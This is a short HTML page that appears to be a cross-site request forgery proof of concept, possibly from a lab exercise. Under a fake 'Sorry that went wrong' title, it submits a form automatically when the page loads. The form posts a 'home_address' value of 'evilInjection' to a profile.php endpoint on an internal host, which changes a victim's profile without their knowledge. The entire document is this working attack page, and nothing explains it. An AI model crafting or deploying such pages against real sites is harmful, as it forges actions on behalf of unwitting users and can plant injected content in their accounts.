<!DOCTYPE html>
<html>

<head>
    <title>Sorry that went wrong</title>
</html>

<body onload="document.forms[0].submit()">
    <form method="POST" action="http://eitf:8000/profile.php">
        <input type="text" name="home_address" value="evilInjection" required>
        <button type="submit">Submit</button>
    </form>
</body>